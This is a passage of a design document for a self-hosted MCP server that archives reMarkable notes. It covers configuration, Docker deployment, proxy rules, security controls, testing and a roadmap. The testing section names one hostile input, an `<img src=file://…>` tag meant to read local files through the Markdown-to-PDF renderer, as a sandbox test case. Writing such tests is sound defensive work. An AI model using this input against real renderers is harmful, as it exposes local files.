| `BLOB_RETENTION_DAYS` | `365` | Eligibility for manual GC only |
| `ANTHROPIC_API_KEY` | unset | Server-wide OCR key (§8) |
| `SERVER_KEY_USERS` | **empty** | Comma-separated user ids/emails allowed to use it (`*` is accepted but discouraged) |
| `OCR_MODEL` | `claude-sonnet-5-5` | |
| `OCR_MONTHLY_CAP_USD` / `OCR_USER_MONTHLY_CAP_USD` | `20` / `10` | Global and per-user caps on server-key spend, all call types |
| `OCR_PRICE_IN_PER_MTOK` / `OCR_PRICE_OUT_PER_MTOK` | list price of `OCR_MODEL` | For cost accounting |
| `OCR_MAX_TOKENS` | `4096` | Output budget per page (§8.2); 256–32000 |
| `OCR_BATCH_MIN` | `10` | Stable pages per poll above which auto-OCR uses the Message Batches API (§7 step 6); 1–10000 |
| `OCR_USER_CONCURRENCY` | `2` | Leased `ocr` jobs per user at once (§6.2); 1–16 |
| `NOTIFICATIONS` | `false` | Poll on the cloud's change notification (§7, S7); refused at start until the spike has passed |
| `NOTIFY_MIN_GAP_SECONDS` | `10` | Minimum gap between a notification-triggered poll and the previous poll's end; 1–3600 |
| `MAX_INLINE_KB` / `MAX_FETCH_MB` | `64` / `50` | §9; S6 |
| `PUSH_URL_ALLOWLIST` | empty | Host suffixes; empty = confirmation required per fetch |
| `INK_SIDECAR_URL` | unset | e.g. `http://scriptorium-ink:9000`; `push_ink` is hidden when unset |
| `DEFAULT_QUOTA_GB` | `20` | Per user |
| `SNAPSHOT_STRATEGY` | `none` | `host` / `restic` / `none` |
| `RESTIC_REPO`, `RESTIC_PASSWORD_FILE` | — | |
| `AUDIT_RETENTION_DAYS` | `365` | |
| `LOG_LEVEL` | `info` | Logs never include note content, tokens or tool arguments |

---

## 13. Deployment

`docker/compose.example.yml` (abridged):

```yaml
services:
  scriptorium:
    image: ghcr.io/milkyengineer/scriptorium:1
    command: serve
    env_file: scriptorium.env
    secrets: [scriptorium_master_keys]
    volumes: ["/srv/scriptorium/data:/data"]          # local filesystem; add ":/data/snapshots:ro" mount for the host strategy
    networks: [proxy, internal]
    read_only: true
    tmpfs: ["/tmp"]
  scriptorium-worker:
    image: ghcr.io/milkyengineer/scriptorium:1
    command: worker
    env_file: scriptorium.env
    secrets: [scriptorium_master_keys]
    volumes: ["/srv/scriptorium/data:/data"]
    networks: [internal]
    read_only: true
    tmpfs: ["/tmp"]
  # ---- optional: only if you have no OIDC issuer.  `docker compose --profile keycloak up` ----
  keycloak:
    profiles: [keycloak]
    image: quay.io/keycloak/keycloak:26.4.7          # the exact version S2 verified
    command: start --import-realm --hostname https://auth.example.com --hostname-admin https://keycloak-admin.internal --http-enabled true --proxy-headers xforwarded
    environment: { KC_DB: postgres, ... }
    volumes: ["./keycloak:/opt/keycloak/data/import:ro"]
    networks: [proxy, internal]
  keycloak-db:
    profiles: [keycloak]
    image: postgres:16
    networks: [internal]
  # ---- optional: AGPL ink sidecar (§4.4); enables push_ink.  `--profile ink` ----
  scriptorium-ink:
    profiles: [ink]
    image: ghcr.io/milkyengineer/scriptorium-ink:1
    networks: [internal]
secrets:
  scriptorium_master_keys: { file: ./secrets/master_keys }   # outside /data; back up separately
```

The default `docker compose up` starts only `scriptorium` and `scriptorium-worker`; `scriptorium.env` points `SCRIPTORIUM_OIDC_ISSUER` at whatever issuer the operator already runs. The `keycloak` profile is a convenience for operators who have none; the `auth.example.com` rows in the proxy table below apply only to it (an existing issuer has its own exposure rules).

**Reverse proxy** (any of Caddy, Traefik, nginx; TLS via ACME; examples in `docker/proxy/`). It may run on the Docker host or on another machine on the operator's network; in the latter case the `scriptorium` and `keycloak` services publish their ports on an interface reachable only by the proxy, and `X-Forwarded-*` headers are trusted from that address alone (`TRUSTED_PROXIES`). The bearer token is the primary access control on `/mcp`; IP allowlisting is defence in depth and is **optional**, because Claude Code and the signed downloads need user-side access. The proxy must allow request bodies of at least 4 MB on `/mcp` (the server's own limit; nginx defaults to 1 MB) and must not buffer responses. Per-path rules:

| Host / path | Reachable from | Notes |
| --- | --- | --- |
| `mcp.example.com/mcp`, `/.well-known/*` | Anthropic egress `160.79.104.0/21`, plus users' networks (or a Tailscale/VPN range) if Claude Code is used; or everyone, relying on bearer auth + rate limits | |
| `mcp.example.com/dl/*` | users' browsers | Unguessable 10-min tokens; rate-limited |
| `mcp.example.com/healthz` | proxy / monitoring only | |
| `auth.example.com/realms/scriptorium/{protocol/openid-connect/*, login-actions/*, broker/*/endpoint, .well-known/*}`, `/resources/*` | Anthropic egress (token, discovery), users' browsers (login), Claude Code (everything) — in practice: everyone, rate-limited | |
| `auth.example.com/realms/scriptorium/clients-registrations/*` | deny (pre-registered clients) or operator IPs | |
| `auth.example.com/admin/*`, `/realms/master/*` | **deny** | Admin console only via the internal hostname |
| `:9100/metrics` | not published | |

- **Cloudflare Tunnel** is an alternative that avoids port-forwarding but terminates TLS at Cloudflare; the direct route is preferred because note content then only transits Anthropic ↔ your host.
- **Health:** `GET /healthz` (server); the worker rewrites `<data>/worker.heartbeat` every 30 s (body: JSON `{"at", "render_pool_rebuilds"}`; liveness is its mtime) and `scriptorium healthcheck --worker` fails once it is older than 180 s (the compose example wires it). One worker per `/data`: it holds an exclusive `flock` on `<data>/worker.lock` and exits with code 3 if another worker holds it.
- **Backups of the backup:** host-level backup of `/srv/scriptorium` (data, the Keycloak DB if the profile is used, `secrets/` kept separately) or the restic strategy to an off-site repo.
- **Image:** `python:3.12-slim` base, `uv` sync, apt `libpango-1.0-0 libpangoft2-1.0-0 libharfbuzz-subset0 fonts-dejavu-core fonts-noto-cjk` for WeasyPrint (≈ +100 MB), non-root user (`PUID`/`PGID` build args or `user:` in compose), read-only root filesystem, `/data` and `/tmp` writable, multi-arch (amd64, arm64 — resvg-py and pypdfium2 ship aarch64 wheels). Published to `ghcr.io/milkyengineer/scriptorium`, tagged by semver; `1` tracks the latest 1.x.
- **CI:** GitHub Actions — ruff, mypy, pytest with cassettes, image build, SBOM, licence gate, push on tag.

Going fully cloud-free (self-hosting the reMarkable cloud with `rmfakecloud`) is out of scope: it requires developer mode on the Paper Pro Move and breaks on every firmware update.

---

## 14. Security

- **Trust model:** the operator can read every user's notes on disk; users must trust the operator. Documented for users in the README.
- **Isolation:** every path is built from the token's `(iss, sub)`; no tool accepts a user id or a path. Document/page identifiers are UUIDs; cloud-supplied filenames pass an allowlist regex; `.rmdoc` zips are extracted with per-entry path checks (no zip-slip); resolved paths are asserted inside the account root.
- **Secrets:** device tokens and user API keys are encrypted at rest (MultiFernet, keys from a Docker secret outside `/data`) and are never returned by any tool, including admin tools. Restic password independent of the master keys.
- **Tokens:** JWT validation with pinned algorithms, cached JWKS with refetch cooldown, strict `iss`/`aud`-membership/`exp`/`nbf`, clock skew 60 s; PATs stored as SHA-256, `scr_` prefix, ≤ 90 d, no admin.
- **Shell:** Scriptorium never passes user- or cloud-derived strings to a shell. Snapshot ids are matched against the server-enumerated list before use; restic is invoked with an argument list, not a command string.
- **Transport:** TLS at the proxy; HSTS; the container is reachable only on the internal Docker network.
- **Rate limits:** per user per minute on tool calls, on push bytes and on URL fetches; global on cloud calls; on `/dl/*` and the 401 path.
- **SSRF and exfiltration:** §9 (`push/fetch.py`): HTTPS, resolve-once + pinned connect, `is_global` on every address, redirect re-validation, byte cap, host allowlist or per-fetch confirmation, host in the audit log.
- **Content sandboxes:** Markdown→PDF with HTML disabled and a deny-all fetcher in a resource-limited subprocess; image and PDF bombs rejected by size before decoding.
- **Audit:** every tool call logged with user, tool, duration, outcome and non-content identifiers; never arguments, content or secrets.
- **Data policy note:** the one-time connect code and all note transcripts pass through the user's Claude conversation; `forget_me` cannot reach into host snapshots or restic history, which age out by retention. Both are stated to users.
- **Supply chain:** pinned `uv.lock`; GitHub Actions pinned by commit SHA and base images (`python`, `uv`) by multi-arch index digest, bumped deliberately in their own commits; image built in CI with SBOM and licence gate; Dependabot on the fork.

---

## 15. Observability

- Structured JSON logs (`LOG_LEVEL`), fields: `ts, level, event, uid (hashed), acct, job, duration_ms, outcome`; no content.
- Prometheus metrics on `METRICS_BIND` (internal only): `scriptorium_sync_duration_seconds{acct}`, `scriptorium_documents_total`, `scriptorium_pages_rendered_total`, `scriptorium_render_failures_total`, `scriptorium_ocr_pages_total{mode}`, `scriptorium_ocr_cost_usd_total{mode}`, `scriptorium_cloud_http_total{status}`, `scriptorium_jobs{state}`, `scriptorium_anomalies{kind}`.
- `account_status` / `admin_status` expose the same numbers through MCP so no dashboard is needed to know the system is healthy.

---

## 16. Testing

- **Unit:** layout helpers and filename allowlist, index and history, job queue (lease expiry, dedupe, backoff), tombstone circuit breaker, OCR cache and caps, settings parsing, JWT validation (test keys, `aud` array, wrong `iss`), SSRF guard (every private range, redirects, rebinding), Markdown sandbox (`<img src=file://…>` must not render), confirmation tokens.
- **Fixtures:** a **dedicated test notebook** written for the purpose (colour pens, highlighter, typed text, an annotated PDF) exported from a Paper Pro Move, with golden PNGs; a sample `.rmdoc`. No real notes in the repo.
- **Cloud contract tests:** recorded HTTP cassettes for root/list/download/upload against the real sync 1.5 API, **scrubbed of tokens and content** before commit, re-recorded on protocol changes; a live smoke test against a scratch account, run manually.
- **Auth integration:** compose profile with the Keycloak realm import; a test client performs PKCE + token (and refresh, concurrent refresh) and calls `/mcp`; a Claude Code run from outside any allowlist.
- **End to end:** Claude Code `claude mcp add` against a local stack, scripted tool calls; a manual checklist from claude.ai mobile (images, download links, push).
- **Licence gate:** `pip-licenses` over the built image in CI; fails on GPL/AGPL.

---

## 17. Roadmap

Details, procedures and acceptance criteria live in `docs/Plan/`. Summary:

### Spikes (results in `docs/Spikes/<id>.md`)

| ID | Question | Pass criterion | Gates |
| --- | --- | --- | --- |
| **S0** | Is `remarkable-mcp` usable as a per-user library without AGPL deps? | Installs with neither `pymupdf` nor `ebooklib`; two clients with different tokens and cache dirs in one process, no env reads at call time; upload with a caller-supplied UUID; a stable reMarkable account identity is extractable from the device token (or documented as unavailable). Else: vendoring plan written. **Result: passed, fork tag `scriptorium-s0`, identity claim `auth0-userid`** | M1 |
| **S1** | Can we upload a native notebook through the cloud API, including under a reused UUID? | An archived notebook re-uploaded under a new UUID opens on the Move; edits round-trip; re-upload under its **original** UUID after deletion restores it; running the job twice creates no duplicate; a generation conflict is retried correctly | M3 (push), M4 (restore) **Result: passed; restore under original UUIDs confirmed on the tablet (`docs/Spikes/S1.md`)** |
| **S2** | Does Keycloak + Claude's OAuth client work end to end with pre-registered clients? | claude.ai (web + mobile) and Claude Code complete login; admin role present in the token; refresh after expiry and after 24 h idle; two concurrent refreshes; Claude Code from a network outside any allowlist; DCR and CIMD compared and documented; exact Keycloak version and realm JSON committed. **Result: passed 2026-10-18 (`docs/Spikes/S2.md`); pre-registered clients ship; the admin role mapping had to move from the client scope to the clients so non-admins receive `aud`; session revocation is the one sub-step still to exercise** | M1 |
| **S3** | Do Paper Pro Move `.rm` files render correctly with rmscene? | The dedicated test notebook (≥ 20 pages, colour, highlighter, typed text, annotated PDF) renders without errors and matches reference photos; panel geometry confirmed **Result: passed; geometry, colours and extents recorded in `docs/Spikes/S3.md`; fork tag `scriptorium-s3`** | M1 |
| **S4** | How does the cloud behave on a free account, and what does the 50-day cut-off look like? | On a free account: list/download/upload work (or are documented as Connect-only); an aged document's state is observed (absent from root / blobs 404 / flagged) and the tombstone `deletion_cause` heuristic is specified from the evidence | M1 |
| **S5** | Two containers + SQLite WAL on the operator's `/data` filesystem; host snapshot feasibility | 24 h soak of server + worker with concurrent reads/writes, no `SQLITE_BUSY` escalations or corruption; `statfs` refusal verified on a FUSE mount; a host snapshot is listed and readable from the container | M1 **Result: steps 1 and 3 passed on the operator's host (btrfs); 24 h soak running (`docs/Spikes/S5.md`)** |
| **S6** | What do Claude clients actually render from this server? | Image blocks on claude.ai mobile; resource links vs signed URLs; max practical tool-argument size; `tools/list` filtering per user — all measured and written down | M1 **Result: passed; matrix and defaults in `docs/Spikes/S6.md` (image blocks reach the model everywhere but the person only on web/Desktop; resource links invisible; `/dl/` URLs copy-paste on claude.ai, clickable in terminals; 64 KB results intact except Claude Code persists them; 4 KB literal arguments stall the client; admin tools listed without reconnect)** |

### Milestones

| # | Name | Contents | Acceptance (abridged; full list in `docs/Plan/02-milestones.md`) |
| --- | --- | --- | --- |
| **M1** | Safe archive, single user | Auth with pre-registered clients and default-deny users; archive with staged atomic commits, version history, tombstones that never auto-purge, circuit breaker, safe mode; render; `list/recent/read_page/read_document(markdown)/page_image/versions/trash`; lazy OCR; audit basics; cassettes; licence gate | Sync lag < 15 min; a cloud-side deletion produces a tombstone and no file deletion; a partial listing produces no tombstones; a mass delete halts; restart mid-download leaves no partial document; p95 tool latency < 2 s on cached data; end-to-end run from claude.ai mobile and Claude Code; CI green including licence gate |
| **M2** | OCR modes and search | User/server keys, auto-OCR with debounce and Batches, caps, FTS `search`, cost accounting | A page is transcribed once per version; caps degrade to lazy; spend in `ocr_status` within 5 % of the API console |
| **M3** | Push | `push_markdown` (sandboxed PDF), `push_file(url)` with SSRF guard and allowlist/confirmation, rate limits; `push_ink` via sidecar when S1 passes | Sandbox tests pass (`file://`, internal hosts refused); a pushed PDF opens on the tablet; a retried push creates no duplicate |
| **M4** | Backup and restore | `snapshots` (host/restic), `restore` (resumable, dry-run token), `export` via signed URL | A wiped scratch tablet is rebuilt, folders included, with no duplicates, and a second run is a no-op |
| **M5** | Multi-user and admin | Quotas, admin tools, transfer link, anomaly clearing, PATs, operator docs | Two users with separate reMarkable accounts, isolation tests, PAT without admin |
| **M6** | Hardening and 1.0 | Metrics, multi-arch image, restic consistency, documentation, threat-model review | Release checklist in the plan |

---

## 18. Open questions

1. Does the reMarkable cloud rate-limit or flag an always-on client that polls every 10 minutes? (S4/S5 soak observes it; the fallback is a longer interval.)
2. Which `.content` fields does the Move require for a notebook it will open (template, orientation, `fileType`, page geometry)? (S1)
3. ~~Is there a stable account identity in the device token for the one-account rule? (S0)~~ Yes: `auth0-userid`, see `docs/Spikes/S0.md`.
4. Whether typed-text native notebooks from Markdown are good enough for a later `push_markdown(as="notebook")`.
5. ~~Policy: before notes belonging to an organisation are synced to a personal, internet-reachable server, confirm that the organisation's data policy permits it.~~ Decided 2026-10-18: Scriptorium is a general tool and does not know whose notes these are; the operator documentation states the policy point, and the user decides scope per account with `set_sync_scope` (§11.1, M2): sync everything (default), or an allow or deny mode keyed on reMarkable tags, applied to folders (inherited by their children) and to documents. Documents outside the scope are never downloaded; the index keeps their metadata rows so `list` can show them as `excluded`.
6. Native, clean-room MIT image-to-ink converter on rmscene, so the AGPL `scriptorium-ink` sidecar can be retired.
7. Whether an IP allowlist on `/mcp` is worth keeping once Claude Code users are in the picture, or whether bearer auth + rate limits + fail2ban-style lockout is the simpler and equally safe posture.
8. ~~Do page UUIDs stay unique across documents?~~ Resolved 2026-10-18 by the first live sync: no. Uploading the same notebook files more than once (as Scriptorium's own push and restore will) gives documents that share page UUIDs; a duplicate made on the tablet mints fresh ones. Pages are keyed `(document, uuid)` and transcripts `(document, page, content_hash)` since account step V2; renders stay keyed by `(page, content_hash)` and are shared. The `links` table is still keyed by page alone and gets a `document` column with the first tool that writes it.
9. What the cloud's notifications websocket requires and delivers (handshake, event shapes, lag to a readable root, concurrent connections). (S7; decides the M2 poll-on-notification item.)

---

## 19. References

- remarkable-mcp (MIT): https://github.com/sammorrowdrums/remarkable-mcp
- rmscene (MIT): https://github.com/ricklupton/rmscene
- rmink (AGPL-3.0-or-later; sidecar only, never in context when writing the native converter): https://pypi.org/project/rmink/
- resvg-py (MIT): https://github.com/baseplate-admin/resvg-py · pypdfium2 (BSD-3/Apache-2.0): https://pypi.org/project/pypdfium2/ · WeasyPrint (BSD-3): https://pypi.org/project/weasyprint/
- ddvk/rmapi (cloud protocol reference): https://pkg.go.dev/github.com/ddvk/rmapi
- rmfakecloud (self-hosted cloud, out of scope): https://github.com/ddvk/rmfakecloud
- Claude connector authentication requirements: https://claude.com/docs/connectors/building/authentication
- Claude Code MCP configuration: https://code.claude.com/docs/en/mcp
- Keycloak: client registration policies, `--import-realm`, MCP guide: https://www.keycloak.org/documentation
- RFC 9728 (protected resource metadata), RFC 8414 (AS metadata), RFC 7591 (DCR), RFC 7636 (PKCE)
- reMarkable device connect page: https://my.remarkable.com/device/browser/connect
- reMarkable Connect / free tier sync limit: https://blog.remarkable.com/shop/connect/pricing
